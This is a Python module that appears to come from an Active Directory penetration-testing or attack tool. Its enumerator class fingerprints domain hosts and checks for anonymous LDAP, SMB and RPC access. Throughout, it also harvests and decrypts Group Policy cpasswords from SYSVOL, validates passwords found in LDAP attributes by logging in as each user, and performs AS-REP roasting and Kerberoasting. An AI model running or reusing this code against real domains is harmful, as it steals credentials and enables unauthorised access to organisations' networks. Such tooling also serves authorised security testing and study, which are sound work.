# -*- coding: utf-8 -*-

import json
import ldap3
import re
import base64
import os
import socket
from ldap3.core.exceptions import LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError
from impacket.dcerpc.v5 import epm
from impacket.smbconnection import SessionError
from impacket.nmb import NetBIOSTimeout, NetBIOSError
from termcolor import colored
from Cryptodome.Cipher import AES
from progressbar import Bar, Percentage, ProgressBar, ETA

from . .connectors.connectors import Connectors
from . .utils.utils import Utils

class ModEnumerator():

    def __init__(self):
        self.utils = Utils()


    def enumerate_server_names(self, computerobjects: ldap3.Entry) -> dict:
        '''Return a dict of key(dNSHostName) and value(fingerprinted servertype)
        
        '''
        wordlist = {
            "mssql": ["mssql", "sqlserver"],
            "ftp": ["ftp"], 
            "smtp": ["exchange", "smtp"],
            "ad": ["dc", "domaincontroller", "msol", "domain controller"]
        }
        results = {}

        for key, value in wordlist.items():
            for fingerprint in value:
                for obj in computerobjects:
                    if fingerprint in str(obj["name"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["dNSHostName"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["distinguishedName"]).lower():
                        results[str(obj["dNSHostName"])] = key
                    elif fingerprint in str(obj["dNSHostName"]).lower():
                        results[str(obj["dNSHostName"])] = key

        return results

    def enumerate_os_version(self, computerobjects: ldap3.Entry) -> dict:
        '''Return a dict of key(os_version) and value(computers with said os)

        '''
        os_json = {
                # Should perhaps include older version
                "Windows XP": [],
                "Windows Server 2008": [],
                "Windows 7": [],
                "Windows Server 2012": [],
                "Windows 10": [],
                "Windows Server 2016": [],
                "Windows Server 2019": []
        }
        idx = 0
        for _ in computerobjects:
            computer = json.loads(computerobjects[idx].entry_to_json())
            idx += 1    

            for os_version in os_json.keys():
                try:
                    if os_version in computer['attributes'].get('operatingSystem')[0]:
                        if computer['attributes']['dNSHostName'][0] not in os_json[os_version]:
                            os_json[os_version].append(computer['attributes']['dNSHostName'][0])
                except TypeError:
                    # computer['attributes'].get('operatingSystem') is of NoneType, just continue
                    continue

        return os_json

    
    def enumerate_for_cleartext_passwords(self, peopleobjects: ldap3.Entry, server: str) -> dict:
        '''Return a dict of key(username) and value(password)

        '''
        passwords = {}

        idx = 0
        for _ in peopleobjects:
            user = json.loads(peopleobjects[idx].entry_to_json())
            idx += 1    
            if user['attributes'].get('userPassword') is not None:
                # Attempt login
                try:
                    # First we try encrypted
                    conn = Connectors().ldap_connector(server=server, ldaps=True, domuser=user['attributes']['name'][0], passwd=user['attributes'].get('userPassword'))
                except LDAPBindError:
                    # Then default to non-encrypted
                    try:
                        conn = Connectors().ldap_connector(server=server, ldaps=False, domuser=user['attributes']['name'][0], passwd=user['attributes'].get('userPassword'))
                    except LDAPBindError:
                        # No luck
                        continue
                finally:
                    if int(conn.result['result']) == 0:
                        # We had a valid login
                        passwords[user['attributes']['name'][0]] = user['attributes'].get('userPassword')

        return passwords


    def enumNULLSessions(self, server: str, connector: Connectors):
        # Test for anonymous binds to ldap
        try:
            ldap = connector.ldap_connector(server, False, '', '')
            print('[ ' + colored('WARN', 'yellow') +' ] Anonymous LDAP bind allowed')
        except LDAPBindError:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous LDAP bind not allowed')
        ldap.unbind()

        # Test for null-session/anonymous session on smb
        smb = connector.smb_connector(server, '', '')
        if smb:
            # It is not False and as such, we got a connection back
            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL SMB connection allowed got ServerOS: {smb.getServerOS()} and HostName: {str(smb.getServerName())}')
        else:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL SMB connection not allowed')
        smb.logoff()

        # Test for null-session/anonymous session on rpc
        rpc = connector.rpc_connector(server, '', '')
        resp = rpc.bind(epm.MSRPC_UUID_PORTMAP)
        # TODO: Validate by negative test
        if resp.getData():
            print('[ ' + colored('WARN', 'yellow') + f' ] Anonymous/NULL RPC connection allowed got following bytes: {resp.getData()} from the connection')
        else:
            print('[ ' + colored('INFO', 'green') +' ] Anonymous/NULL RPC connection not allowed')


    def enumSYSVOL(self, server: str, connector: Connectors, domuser: str, passwd: str) -> dict:
        print('[ .. ] Searching SYSVOL for cpasswords\r')
        cpasswords = {}
        try:
            smbconn = connector.smb_connector(server, domuser, passwd)
            dirs = smbconn.listShares()
            for share in dirs:
                if str(share['shi1_netname']).rstrip('\0').lower() == 'sysvol':
                    path = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                    paths = [e.get_shortname() for e in path if len(e.get_shortname()) > 2]
                    for dirname in paths:
                        try:
                            # Dont want . or ..
                            subPath = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), str(dirname) + '\\*')
                            for sub in subPath:
                                if len(sub.get_shortname()) > 2:
                                    paths.append(dirname + '\\' + sub.get_shortname())
                        except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                            continue
                
                    # Compile regexes for username and passwords
                    cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
                    unameRE = re.compile(r'userName|runAs=\"([ a-zA-Z0-9/\(\)-]+)\"')

                    # Prepare the ciphers based on MSDN article with key and IV
                    cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, bytes.fromhex('00' * 16))
                
                    # Since the first entry is the DC we dont want that
                    for item in paths[1:]:
                        if '.xml' in item.split('\\')[-1]:
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                                smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                            with open('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                                try:
                                    fileContent = f.read()
                                    passwdMatch = cpassRE.findall(str(fileContent))
                                    for passwd in passwdMatch:
                                        unameMatch = unameRE.findall(str(fileContent))
                                        for usr in unameMatch:
                                            padding = '=' * (4 - len(passwd) % 4) 
                                            # For some reason, trailing nul bytes were on each character, so we remove any if they are there
                                            cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip().decode('utf-8').replace('\x00', '')
                                except (UnicodeDecodeError, AttributeError) as e:
                                    # Remove the files we had to write during the search
                                    os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))
                                    continue

                            # Remove the files we had to write during the search
                            os.unlink('{0}-{1}'.format(item.split('\\')[-2], item.split('\\')[-1]))

        except (SessionError, UnicodeEncodeError, NetBIOSError):
            print('[ ' + colored('ERROR', 'red') + ' ] Some error occoured while searching SYSVOL')
        else:
            smbconn.close()
            return cpasswords


    def enumSMB(self, connector: Connectors, smbShareCandidates: list, server: str, domuser: str, passwd: str) -> dict:
        progBar = ProgressBar(widgets=['SMBConnection test: ', Percentage(), Bar(), ETA()], maxval=len(smbShareCandidates)).start()
        smbBrowseable = {}
        prog = 0
        try:
            for dnsname in smbShareCandidates:
                try:
                    # Changing default timeout as shares should respond withing 5 seconds if there is a share
                    # and ACLs make it available to self.user with self.passwd
                    smbconn = connector.smb_connector(server, domuser, passwd)
                    dirs = smbconn.listShares()
                    smbBrowseable[str(dnsname)] = {}
                    for share in dirs:
                        smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = ''
                        try:
                            _ = smbconn.listPath(str(share['shi1_netname']).rstrip('\0'), '*')
                            smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = True
                        except (SessionError, UnicodeEncodeError, NetBIOSError):
                            # Didnt have permission, all good
                            # Im second guessing the below adding to the JSON file as we're only interested in the listable directories really
                            #self.smbBrowseable[str(dnsname)][str(share['shi1_netname']).rstrip('\0')] = False
                            continue
                    smbconn.logoff()
                    progBar.update(prog + 1)
                    prog += 1
                except (socket.error, NetBIOSTimeout, SessionError, NetBIOSError):
                    # TODO: Examine why we sometimes get:
                    # impacket.smbconnection.SessionError: SMB SessionError: STATUS_PIPE_NOT_AVAILABLE
                    # on healthy shares. It seems to be reported with CIF shares 
                    progBar.update(prog + 1)
                    prog += 1
                    continue
        except ValueError:
            # We reached end of progressbar, continue since we finish below
            pass
        progBar.finish()
        print('')
        return smbBrowseable


    def enumASREPRoast(self, conn: ldap3.Connection, server: str, dc_string) -> list:
        from . .attacks.asreproast import asreproast
        roaster = asreproast.AsRepRoast()
        # Build user array
        users = []
        conn.search(dc_string, '(&(samaccounttype=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))', attributes='*', search_scope=ldap3.SUBTREE)
        for entry in conn.entries:
            users.append(str(entry['sAMAccountName']) + '@{0}'.format(server))
        if len(users) == 0:
            print('[ ' + colored('OK', 'green') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
        elif len(users) == 1:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} account that does not require Kerberos preauthentication'.format(len(users)))
        else:
            print('[ ' + colored('OK', 'yellow') +' ] Found {0} accounts that does not require Kerberos preauthentication'.format(len(users)))
    
        hashes = []
        # Build request for Tickets
        for usr in users:
            userHash = roaster.RepRoast(server, usr)
            if userHash:
                hashes = hashes + userHash
        
        return hashes


    def enumKerberoast(self, spn: list, domuser: str, passwd: str) -> dict:
        from . .attacks.kerberoast import kerberoast
        kerberoaster = kerberoast.Kerberoast()

        users_spn = {}
        user_tickets = {}

        userDomain = domuser.split('@')[1]

        idx = 0
        for _ in spn:
            spns = json.loads(spn[idx].entry_to_json())
            users_spn[self.utils.splitJsonArr(spns['attributes'].get('name'))] = self.utils.splitJsonArr(spns['attributes'].get('servicePrincipalName')) 
            idx += 1    
        for user, spn in users_spn.items():
            if isinstance(spn, list):
                # We only really need one to get a ticket
                spn = spn[0]
            else:
                tickets = kerberoaster.roast(domuser, passwd, userDomain, user, spn)
                if tickets:
                    user_tickets = { **user_tickets, **tickets }

        return user_tickets


    def enumForCreds(self, CREDS: bool, passwords: dict, ldapdump: list, connector: Connectors, server: str) -> bool:
        searchTerms = [
                'legacy', 'pass', 'password', 'pwd', 'passcode'
        ]
        excludeTerms = [
                'badPasswordTime', 'badPwdCount', 'pwdLastSet', 'legacyExchangeDN'
        ]
        possiblePass = {}
        idx = 0
        for _ in ldapdump:
            user = json.loads(ldapdump[idx].entry_to_json())
            for prop, value in user['attributes'].items():
                if any(term in prop.lower() for term in searchTerms) and not any(ex in prop for ex in excludeTerms):
                    try:
                        possiblePass[user['attributes']['userPrincipalName'][0]] = value[0]
                    except KeyError:
                        # Could be a service user instead
                        try:
                            possiblePass[user['attributes']['servicePrincipalName'][0]] = value[0]
                        except KeyError:
                            # Don't know which type
                            continue

            idx += 1
        if len(possiblePass) > 0:
            print('[ ' + colored('INFO', 'green') +' ] Found possible password in properties - attempting to determine if it is a password')

            for user, password in possiblePass.items():
                try:
                    usr, passwd = self.entroPass(user, password, server, CREDS, connector)
                except TypeError:
                    # None returned, just continue
                    continue
            if not CREDS:
                domuser = usr
                passwd = passwd
                passwords[domuser] = passwd
                return True, passwords
        return False, passwords


    def entroPass(self, user: str, password: str, server: str, CREDS: bool, connector: Connectors):
        test_conn = None
        if not password:
            return None
        # First check if it is a clear text
        try:
            test_conn = connector.ldap_connector(server, True, user, password)
        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
            try:
                test_conn = connector.ldap_connector(server, False, user, password)
            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
                pass
        if test_conn:
            # Validate the login (bind) request
            if int(test_conn.result['result']) != 0:
                if CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible clear text password'.format(user, password))
                else:
                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not cleartext'.format(user, password))
            else:
                if CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property'.format(user, password))
                else:
                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had cleartext password of: "{1}" in a property - continuing with these creds'.format(user, password))
                    print('')
                    return user, password
            test_conn.unbind()
            test_conn = None

        # Attempt for base64
        # Could be base64, lets try
        try:
            pw = base64.b64decode(bytes(password, encoding='utf-8')).decode('utf-8')
        except base64.binascii.Error:
            return None
    
        # Attempt decoded PW
        try:
            test_conn = connector.ldap_connector(server, True, user, pw)
        except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
            try:
                test_conn = connector.ldap_connector(server, False, user, pw)
            except (LDAPBindError, LDAPSocketOpenError, LDAPSocketSendError):
                pass
        if test_conn:
            # Validate the login (bind) request
            if int(test_conn.result['result']) != 0:
                test_conn.unbind()
                if CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" with: "{1}" as possible base64 decoded password'.format(user, pw))
                else:
                    print('[ ' + colored('INFO', 'green') +' ] User: "{0}" with: "{1}" was not base64 encoded'.format(user, pw))
            else:
                if CREDS:
                    print('[ ' + colored('INFO', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property'.format(user, pw))
                else:
                    print('[ ' + colored('OK', 'yellow') +' ] User: "{0}" had base64 encoded password of: "{1}" in a property - continuing with these creds'.format(user, pw))
                    print('')
                    return user, pw